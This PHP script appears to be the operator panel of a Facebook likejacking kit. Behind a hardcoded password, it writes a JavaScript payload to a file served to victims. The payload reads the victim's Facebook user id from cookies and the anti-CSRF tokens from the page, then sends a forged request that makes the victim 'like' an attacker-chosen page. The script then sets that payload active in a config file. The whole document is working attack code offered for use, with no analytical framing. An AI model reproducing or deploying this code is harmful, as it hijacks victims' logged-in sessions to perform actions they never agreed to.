<?php
$password = $_POST["pass"];
$pageID = $_POST["pageID"];
if ($password == "tno" & $pageID != "") {
  $module = "../../ping/main.js";
  $moduleOpen = fopen($module, 'w');
  $payLoad = 'if (document.domain.search("facebook") == 0) { var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var cid = document.getElementsByName("xhpc_composerid")[0].value; var tid = document.getElementsByName("xhpc_targetid")[0].value; var fbdt = Env.fb_dtsg; var fid = Env.post_form_id; /* Like a page */ function likepage(pageid) { var likepost = "fbpage_id=" + pageid + "&add=1&reload=1&preserve_tab=true&nctr[_mod]=pagelet_header&post_form_id=" + fid + "&fb_dtsg=" + fbdt + "&lsd&post_form_id_source=AsyncRequest"; var likepage = new XMLHttpRequest(); likepage.open("POST", "/ajax/pages/fan_status.php?__a=1"); likepage.send(likepost); } likepage("'.$pageID.'"); }';
  fwrite($moduleOpen, $payLoad);
  fclose($moduleOpen);
  
    // turn into a class damnit
  include('ini_parser_v1.php');
  $ini_data = 'active = like_page_facebook';
  $ini_file = <<<EOT
;<?php
;die(); // For further security
;/*
$ini_data
;*/
;?>
EOT;

  safefilerewrite("../../db/active_payload.php", $ini_file);
  header('Location: ../../modules/index.php');
} else {
  echo 'error';
}
?>
